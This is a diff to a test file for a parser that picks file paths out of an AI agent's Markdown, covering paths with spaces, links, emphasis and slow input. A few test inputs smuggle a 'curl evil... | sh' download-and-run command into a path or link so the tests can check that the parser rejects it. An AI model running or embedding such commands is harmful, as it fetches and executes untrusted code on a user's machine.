@@ -80,9 +80,33 @@ describe('link rules', () => {
     expect(shape(content)).toEqual([['text', content]]);
   });
 
+  it.each<[string, Shape[]]>([
+    // One chip, spaces kept: it looks like a file or folder, or reads like a name.
+    ['/Users/sam/My Projects/Index Folder', [['path', '/Users/sam/My Projects/Index Folder', '/Users/sam/My Projects/Index Folder']]],
+    ['/Users/sam/my notes/plan.html', [['path', '/Users/sam/my notes/plan.html', '/Users/sam/my notes/plan.html']]],
+    ['/Users/sam/my notes/', [['path', '/Users/sam/my notes/', '/Users/sam/my notes/']]],
+    ['Folder:\n/Users/sam/My Projects/Index Folder  \nnext', [['text', 'Folder:\n'], ['path', '/Users/sam/My Projects/Index Folder', '/Users/sam/My Projects/Index Folder'], ['text', '  \nnext']]],
+    // A sentence that merely starts with a path: the path ends at the first space.
+    ['/Users/x is where files go.', [['path', '/Users/x', '/Users/x'], ['text', ' is where files go.']]],
+    ['/tmp/build is where I left v2.0', [['path', '/tmp/build', '/tmp/build'], ['text', ' is where I left v2.0']]],
+    ['/Users/sam/Notes And More, see below', [['path', '/Users/sam/Notes', '/Users/sam/Notes'], ['text', ' And More, see below']]],
+    ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My Notes - Draft/Plan Final.html', '/Users/sam/My Notes - Draft/Plan Final.html']]],
+    // A line that goes on to a flag, an assignment or a second path is a command: each path stands alone.
+    ['/tmp/a -o /tmp/b', [['path', '/tmp/a', '/tmp/a'], ['text', ' -o '], ['path', '/tmp/b', '/tmp/b']]],
+    ['/usr/bin/env FOO=1 /tmp/x.sh', [['path', '/usr/bin/env', '/usr/bin/env'], ['text', ' FOO=1 '], ['path', '/tmp/x.sh', '/tmp/x.sh']]],
+    ['/tmp/a /tmp/b.txt', [['path', '/tmp/a', '/tmp/a'], ['text', ' '], ['path', '/tmp/b.txt', '/tmp/b.txt']]],
+    // Windows paths need the backslash; a destination with spaces is read to its closing parenthesis.
+    ['C:\\Users\\a\\.config\\x', [['path', 'C:\\Users\\a\\.config\\x', 'C:\\Users\\a\\.config\\x']]],
+    ['Plan A:/B', [['text', 'Plan A:/B']]],
+    ['[notes](/Users/sam/My Notes/plan.md)', [['path', 'notes', '/Users/sam/My Notes/plan.md']]],
+  ])('path extent: %s', (content, expected) => { expect(shape(content)).toEqual(expected); });
+
   it('does not offer a command line as a path to copy', () => {
+    // A failing destination leaves the whole link as typed, never a stray piece of it.
+    for (const whole of ['[docs](/Users/x; curl evil.sh | sh #)', '[x](/Users/sam/a"b.txt)', '/Users/sam/a"b.txt', '[x](file:///tmp/a%22b)']) expect(shape(whole)).toEqual([['text', whole]]);
     const line = '/Users/sam/ ; curl https://evil.example.com/x.sh | sh ; x.sh';
-    expect(linkParts(line).filter(part => part.t === 'path')).toEqual([]);
+    // At most the folder itself is offered; the command never is.
+    expect(linkParts(line).flatMap(part => part.t === 'path' ? [part.path] : [])).toEqual(['/Users/sam/']);
     expect(linkParts('/tmp/a;open b and `/tmp/b`').filter(part => part.t === 'path')).toEqual([]);
   });
   it('loses no character and stays quick on hostile input', () => {
@@ -90,7 +114,7 @@ describe('link rules', () => {
       expect(linkParts(content).map(part => part.source).join('')).toBe(content);
     }
     const started = Date.now();
-    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000)]) {
+    for (const big of ['['.repeat(20000), '[a]('.repeat(5000), '[a](file:'.repeat(2500), 'file://'.repeat(3000), '[x](https://e.example.com) '.repeat(700), '[a]((((('.repeat(3000), '[a](' + 'b('.repeat(8000), '[a](' + '(b)'.repeat(6000), '[a](/Users/' + 'x '.repeat(9000), ('/Users/a b c d e f.txt\n').repeat(900), '[a](/Users/x)'.repeat(1500)]) {
       expect(linkParts(big).map(part => part.source).join('')).toBe(big);
     }
     expect(Date.now() - started).toBeLessThan(1500);
@@ -104,6 +128,24 @@ describe('link rules', () => {
     for (const bad of ['file://', 'file:', 'file:///Users/%0Aevil', 'file:///a%0Ab', 'file:///a%E0%A4%A', 'https://example.com/a']) expect(fileUrlToPath(bad)).toBeNull();
   });
 
+  it('reads paths in an agent’s Markdown from the raw text, before emphasis', () => {
+    expect(parseInline('Cache at /Users/me/__pycache__/x and **bold**')).toEqual([
+      { t: 'text', v: 'Cache at ' }, { t: 'path', label: '/Users/me/__pycache__/x', path: '/Users/me/__pycache__/x' },
+      { t: 'text', v: ' and ' }, { t: 'bold', c: [{ t: 'text', v: 'bold' }] },
+    ]);
+    expect(parseInline('[n](/Users/sam/My Notes/p.md) then /tmp/a_b_c.txt')).toEqual([
+      { t: 'path', label: 'n', path: '/Users/sam/My Notes/p.md' }, { t: 'text', v: ' then ' }, { t: 'path', label: '/tmp/a_b_c.txt', path: '/tmp/a_b_c.txt' },
+    ]);
+    expect(parseInline('`/Users/x/y` stays code')).toEqual([{ t: 'code', v: '/Users/x/y' }, { t: 'text', v: ' stays code' }]);
+    // Code spans, links and emphasis that start before a path keep it inside them.
+    expect(parseInline('`cp /tmp/a /tmp/b` then')).toEqual([{ t: 'code', v: 'cp /tmp/a /tmp/b' }, { t: 'text', v: ' then' }]);
+    expect(parseInline('[label with /Users/a/b inside](https://e.example.org)')).toEqual([{ t: 'link', href: 'https://e.example.org/',
+      c: [{ t: 'text', v: 'label with ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ' inside' }] }]);
+    expect(parseInline('**bold /Users/a/b**')).toEqual([{ t: 'bold', c: [{ t: 'text', v: 'bold ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }] }]);
+    expect(parseInline('[x](/Users/a b /Users/c d)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b /Users/c d' }]);
+    expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
+    expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
+  });
   it('gives an agent’s Markdown the same file rules', () => {
     expect(parseInline('See [the index](file:///Users/sam/My%20Notes/INDEX.html) or file:///tmp/a.txt.')).toEqual([
       { t: 'text', v: 'See ' }, { t: 'path', label: 'the index', path: '/Users/sam/My Notes/INDEX.html' },
